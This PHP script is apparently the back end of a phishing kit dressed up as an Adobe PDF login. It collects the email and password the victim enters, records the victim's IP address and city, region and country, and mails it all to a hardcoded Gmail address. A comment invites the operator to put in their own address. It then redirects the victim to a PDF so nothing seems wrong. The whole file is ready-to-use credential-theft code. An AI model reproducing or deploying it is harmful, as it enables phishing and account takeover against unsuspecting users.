<?php
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
$adddate=date("D M d, Y g:i a");
$message .= "|----------| A D O B E PDF  |--------------|\n";
$message .= "|eMail : ".$_POST['email']."\n";
$message .= "|PasSword : ".$_POST['password']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "Date: ".$adddate."\n";
$message .= "|----------- A D O B E PDF 2018 --------------|\n";
//>> CHANGE YOUR EMAIL HERE  <<
$send = "rn01wlx@gmail.com";
$subject = "$country | $ip";
{
mail("$send", "$subject", $message);   
}
header("Location: AE0B3628-4154-4B1E-AA50-36B95DA15646.pdf");
?>